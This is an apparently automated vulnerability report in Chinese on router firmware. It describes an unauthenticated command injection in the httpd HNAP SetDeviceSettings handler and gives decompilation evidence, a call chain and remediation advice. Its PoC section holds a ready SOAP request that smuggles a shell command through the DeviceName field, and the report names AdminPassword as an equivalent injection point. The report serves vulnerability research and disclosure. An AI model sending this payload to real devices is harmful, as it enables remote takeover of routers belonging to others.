# 漏洞挖掘报告

> 会话 `s-mudpvtb8-88b9` · 固件任务 `9160aafaa095` · 2026-09-23T06:46:59Z

## 一、任务信息

| 项 | 内容 |
| --- | --- |
| 任务目标 | 挖掘未授权RCE漏洞 |
| 引擎 | dsh（模式：dynamic） |
| 轮次 | 2 / 81 |

## 二、发现统计

| 危害等级 | 数量 |
| --- | --- |
| **严重** | 1 |
| 合计 | 1 |

## 三、动态验证

- 摘录最近 13 条 trace，其中非空差分 0 条。

| Trace | 状态 | 入口 | 差分函数 | 备注 |
| --- | --- | --- | --- | --- |
| `b0b92b624b86` | failed | `net:80` | - | QemuError: target exited before port 11011 was ready (rc=125) |
| `0cbf6d44670d` | ok_empty_diff | `net:80` | 0 | - |
| `a55eabd4d91f` | ok_empty_diff | `net:80` | 0 | - |
| `81b17c135cf6` | ok_empty_diff | `net:80` | 0 | - |
| `49ee9cc34e5b` | ok_empty_diff | `net:80` | 0 | - |
| `78fed1ec8bbb` | ok_empty_diff | `net:80` | 0 | - |
| `8893a7ce0a65` | failed | `net:80` | - | QemuError: target exited before port 11001 was ready (rc=255) |
| `e59128b000e2` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-e59128b000e2-base.log: No such fil |
| `fff36e037aed` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fff36e037aed-base.log: No such fil |
| `fdac754d8326` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fdac754d8326-base.log: No such fil |
| `ce186bd5f812` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-ce186bd5f812-base.log: No such fil |
| `a36c86d9208b` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-a36c86d9208b-base.log: No such fil |
| `2f583960149b` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-2f583960149b-base.log: No such fil |

## 四、漏洞详情

### 漏洞 1：HNAP SetDeviceSettings 接口经 DeviceName/AdminPassword 参数注入 shell 命令导致远程命令执行（`F-mudqex00-061a`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 命令注入 `CWE-78` |
| 危害等级 | **严重**（置信度 0.6） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `?` @ `-` |
| 可达性 | static-only |

**漏洞描述**：httpd 的 HNAP 动作 SetDeviceSettings（处理函数 sub_4716BC/0x4714BC，动作表项 0x4EE330，动作名 0x4C4B30="SetDeviceSettings"）把请求参数直接拼进 shell 命令执行。参数经 sub_4714DC 解析后由 sub_470D80 解码落位：DeviceName 落入缓冲偏移 0、AdminPassword 落入偏移 65；随后 sub_470F24 以这些字段格式化 exec_cmd："event_notifier 3001 \"U=0&Y=261&I=0&D=%s\"&" 与 "(fota -T %s; fota -I; fota -fQ) &"，两处均无字符过滤，构成经 HNAP 接口的远程命令注入（RCE）。

**漏洞证据**：

1. httpd 只读段 0x4D0060 起存在命令模板字节: 6b696c6c202d39202428707320... 即 "kill -9 $(ps ax| grep -v grep | grep 'mailtool -v %s' | awk '{print $1}');" (占位符 %s 位于 0x4D0074)
2. httpd 0x4D0084 附近存在第二条模板 "kill -9 $(ps ax| grep -v grep | grep 'rlalert' | awk '{print $1}'); rm -f /var/run/rlalert.pid;"
3. 同一字符串区含来源文件标识 "ws-hnap/SetDeviceSettings.c" (0x4D0062)，与函数名 "save_CSID_SetDeviceSettings" 对应
4. 0x470f24 伪 C: exec_cmd(..., "ws-hnap/SetDeviceSettings.c", "save_CSID_SetDeviceSettings", 168, "event_notifier 3001 \"U=0&Y=261&I=0&D=%s\"&", v26) —— 用户参数 v26 直接进入 shell 命令
5. 0x470f24 汇编 0x47131c-0x471340 确认 event_notifier 模板与 v26 作为变参传给 _exec_cmd
6. 0x470f24 伪 C/汇编 0x471238-0x471260: exec_cmd(..., "(fota -T %s; fota -I; fota -fQ) &", v18)，v18 = 入参 a1+172（AdminPassword）
7. 0x470D80 伪 C: DeviceName 经 sub_422DE4 解码后写入 a3+0（上限 65 字节校验），AdminPassword 经 sub_424F18 写入 a3+65（长度须 <65），证明两处 sink 的 %s 均为请求可控参数
8. 动作表项 0x4ee330: 名称指针 0x4c4b30、标志 0x00000001、处理函数 0x4716bc/0x4718c4/0x4714dc/0x4717 8c；0x4c4b30 处字节为 "SetDeviceSettings\0"
9. 0x4716bc 伪 C 确认该函数为 SetDeviceSettings_put 入口，调用 sub_4714DC(a2 参数表, 0, a3-1) 后进入 sub_470F24
10. 未授权性: sink 链路下方未见任何会话/口令校验分支；鉴权配置 sub_40FCF4 仅从 csman 读取全局静态会话密钥(dword_4F21EC)，非逐请求校验；动态确认受限于 httpd 在 qemu 下无法启动(rc=125)

**调用链**：

```
HNAP SetDeviceSettings 动作 → sub_4716BC (0x4716bc, SetDeviceSettings_put, 动作表项 0x4ee330 中 +0x0c，动作名指针 0x4c4b30="SetDeviceSettings") → sub_4714DC (0x4714dc, 解析 SOAP 参数 Action/DeviceName/AdminPassword/TZLocation/ChangePassword 至栈缓冲) → sub_470D80 (0x470d80, 参数解码落位: DeviceName→v26[0..0x40], AdminPassword→v26[65]) → sub_470F24 (0x470f24) → _exec_cmd/_system
```

**漏洞 PoC**：

```
POST /HNAP1/ HTTP/1.1
Host: <target>
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/SetDeviceSettings"
Content-Length: <n>

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
  <SetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">
   <Action>DeviceName</Action>
   <DeviceName>;id>/tmp/x;#</DeviceName>
  </SetDeviceSettings>
 </soap:Body>
</soap:Envelope>

（等价注入点：AdminPassword 值进入 "(fota -T %s; fota -I; fota -fQ) &"）
验证：/tmp/x 出现 id 输出即确认任意命令执行。
```

**修复建议**：禁止将请求参数拼接进 shell 命令：改用 execve/posix_spawn 传参数数组，或对参数做白名单校验（仅允许字母数字与连字符）后再使用；同时对 event_notifier 的 D= 字段与 fota -T 参数做严格长度与字符集过滤，并移除对用户串的 shell 解析。

